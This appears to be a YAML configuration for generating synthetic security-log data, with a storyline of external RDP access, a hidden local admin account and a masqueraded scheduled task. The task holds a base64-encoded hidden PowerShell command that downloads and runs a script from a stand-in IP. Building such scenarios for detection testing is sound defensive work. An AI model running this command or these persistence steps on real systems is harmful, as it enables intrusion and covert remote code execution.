time_window:
  start: '2026-10-13T13:00:00Z'
  duration: 2h
  warmup: 1h
generation_seed: 8287
baseline_activity:
  description: Quiet afternoon
  intensity: medium
  variation: low
  suspicious_noise: medium
observation_profile: complete
storyline:
- id: rdp
  time: +39m
  actor: sean.byrne
  system: WS-RDIAZ-01
  activity: RDP from external IP
  events:
  - type: rdp_session
    source_ip: 198.51.100.77
- id: persist
  time: +43m
  actor: sean.byrne
  system: WS-RDIAZ-01
  activity: Local admin + hidden PowerShell task
  events:
  - type: account_created
    target_username: sysops
  - type: group_member_added
    group_name: Administrators
    member_name: sysops
    scope: local
  - type: scheduled_task_created
    task_name: \Microsoft\Windows\HealthCheck
    task_content: powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAGkAdwByACAAaAB0AHQAcAA6AC8ALwAxADkAOAAuADUAMQAuADEAMAAwAC4ANwA3AC8AYQAuAHAAcwAxACkA
output:
